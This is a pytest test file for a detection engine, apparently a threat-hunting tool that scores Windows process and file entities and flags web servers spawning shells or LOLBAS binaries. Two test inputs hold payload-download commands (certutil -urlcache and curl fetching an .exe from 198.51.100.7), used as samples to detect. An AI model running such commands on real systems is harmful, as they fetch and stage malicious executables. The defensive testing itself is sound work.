from types import SimpleNamespace
from typing import Any

import pytest

from sibyl_h0und.flags import HIGH, Finding, FlagBoard, Properties, flag_feedback
from sibyl_h0und.rules import DEFAULT_RULES


def process(**properties: Any) -> dict[str, Any]:
    """Build a process entity as the runtime returns it."""
    return {"id": "proc-1", "type": "windows_process", "properties": properties}


def file(path: str) -> dict[str, Any]:
    """Build a file entity as the runtime returns it."""
    return {"id": "file-1", "type": "windows_file", "properties": {"path": path}}


def judge(node: dict[str, Any]) -> dict[str, tuple[str, dict[str, int]]]:
    """Return level and ratings of each rule that spoke about a node."""
    return {
        finding.rule: (finding.level, finding.ratings)
        for finding in FlagBoard(DEFAULT_RULES).observe(node)
    }


@pytest.mark.parametrize(
    ("path", "level", "ratings"),
    [
        ("C:\\Users\\Public\\update.ps1", "medium", {"location": 1, "form": 2}),
        ("c:/windows/temp/Run.HTA", "medium", {"location": 1, "form": 2}),
        ("C:\\Windows\\System32\\drivers\\x.ps1", "high", {"location": 2, "form": 2}),
        ("\\\\host\\C$\\tools\\run.bat", "high", {"location": 2, "form": 2}),
        ("C:\\Users\\bob\\AppData\\Local\\Temp\\a.zip", "low", {"location": 1, "form": 0}),
        ("C:\\Windows\\System32\\kernel32.dll", "low", {"location": 2}),
        ("D:\\Shares\\a.rar", "low", {"location": 0, "form": 1}),
    ],
)
def test_file_rating_follows_the_cheat_sheet(
    path: str, level: str, ratings: dict[str, int]
) -> None:
    """Location and extension are rated per the sheet and summed into a level."""
    assert judge(file(path)) == {"nextron_file": (level, ratings)}


def test_linux_file_is_not_rated() -> None:
    """Without data for any attribute the rule stays silent instead of scoring 0."""
    assert judge(file("/tmp/payload")) == {}


@pytest.mark.parametrize(
    ("properties", "level", "ratings"),
    [
        # Running from System32 is normal, the sheet's "highly relevant" is for dropped files.
        (
            {"image_path": "C:\\Windows\\System32\\net.exe", "user_sid": "S-1-5-21-1-2-3-1105"},
            "low",
            {"location": 0, "user": 0},
        ),
        (
            {"image_path": "C:\\PerfLogs\\a.exe", "user_sid": "S-1-5-18"},
            "high",
            {"location": 1, "user": 1},
        ),
        (
            {"image_path": "C:\\ProgramData\\a.exe", "integrity_level": "high"},
            "low",
            {"location": 0, "user": 1},
        ),
        ({"user_sid": "S-1-5-21-1-2-3-500"}, "low", {"user": 1}),
    ],
)
def test_process_rating_expects_system_directories(
    properties: dict[str, Any], level: str, ratings: dict[str, int]
) -> None:
    """A process image in a Windows directory is not suspicious, its account still counts."""
    assert judge(process(**properties)) == {"nextron_process": (level, ratings)}


def test_web_server_spawning_a_shell_is_high_by_itself() -> None:
    """A level rule gives its fixed level whatever the attributes say."""
    findings = judge(
        process(
            image_path="C:\\Windows\\System32\\cmd.exe",
            parent_image="C:\\Windows\\System32\\inetsrv\\w3wp.exe",
            user_sid="S-1-5-21-1-2-3-1105",
        )
    )

    assert findings["web_server_spawns_shell"][0] == "high"
    assert findings["nextron_process"][0] == "low"


def test_board_reports_a_node_once_and_again_only_when_it_changes() -> None:
    """Repeated results stay quiet, a later response with more properties is re-judged."""
    board = FlagBoard(DEFAULT_RULES)
    partial = process(image_path="C:\\ProgramData\\a.exe")
    full = process(image_path="C:\\ProgramData\\a.exe", user_sid="S-1-5-18")

    assert len(board.observe({"entities": [partial]})) == 1
    assert board.observe({"result": partial}) == []
    changed = board.observe(full)

    assert [finding.ratings for finding in changed] == [{"location": 0, "user": 1}]


def test_lolbas_transfer_binary_with_a_url_is_medium() -> None:
    """The toy pack works end to end: a raw image path finds its LOLBAS entry."""
    findings = judge(
        process(
            image_path="C:\\Windows\\System32\\certutil.exe",
            command_line="certutil -urlcache -f http://198.51.100.7/a.exe a.exe",
        )
    )

    assert findings["lolbas_process"][0] == "medium"


def test_lolbas_match_without_a_transfer_stays_low() -> None:
    """Being a LOLBin is common, so a plain match is only traced, not shown."""
    findings = judge(process(image_path="C:\\Windows\\System32\\rundll32.exe"))

    assert findings["lolbas_process"][0] == "low"
    assert flag_feedback(FlagBoard(DEFAULT_RULES).observe(process(image_path="rundll32"))) == []


def test_rules_that_agree_on_a_node_make_one_line() -> None:
    """Several rules about one node reach the model as one line at the highest level."""
    node = process(
        image_path="C:\\Windows\\System32\\cmd.exe",
        parent_image="C:\\Windows\\System32\\inetsrv\\w3wp.exe",
        command_line="cmd /c curl http://198.51.100.7/x -o x.exe",
    )

    (line,) = flag_feedback(FlagBoard(DEFAULT_RULES).observe(node))

    assert line["level"] == "high"
    assert "web_server_spawns_shell:" in line["why"]
    assert "lolbas_process:" in line["why"]


def test_flags_per_result_are_capped_highest_first() -> None:
    """A noisy result shows at most the limit, high before medium, and counts the rest."""
    medium = [file(f"C:\\Users\\Public\\{index}.ps1") | {"id": f"m{index}"} for index in range(6)]
    high = file("C:\\PerfLogs\\run.bat") | {"id": "h"}

    lines = flag_feedback(FlagBoard(DEFAULT_RULES).observe([*medium, high]), limit=5)

    assert [line.get("id") for line in lines] == ["h", "m0", "m1", "m2", "m3", None]
    assert lines[-1]["omitted"] == 2


def test_rule_reads_neighbors_when_the_relation_arrives_later() -> None:
    """A file is judged again with its writer once the relation joining them is seen."""

    def writer_is_office(node_id: str, node_type: str, properties: Properties, context):
        writers = context.neighbors(node_id, direction="in", types={"wrote_file"})
        if node_type == "windows_file" and any(
            node.properties.get("image_path", "").endswith("winword.exe") for node in writers
        ):
            return Finding(node_id, node_type, "office_drop", HIGH, "written by winword.exe")
        return None

    rule = SimpleNamespace(name="office_drop", source="test", evaluate=writer_is_office)
    board = FlagBoard([rule])
    word = process(image_path="C:\\Program Files\\Office\\winword.exe")
    dropped = file("C:\\Users\\bob\\AppData\\Local\\Temp\\a.js")

    assert board.observe({"entities": [word, dropped]}) == []
    relation = {"id": "rel-1", "type": "wrote_file", "source_id": "proc-1", "target_id": "file-1"}
    (finding,) = board.observe(relation)

    assert (finding.node_id, finding.reason) == ("file-1", "written by winword.exe")
    assert board.context.endpoints("rel-1") == (
        board.context.get("proc-1"),
        board.context.get("file-1"),
    )
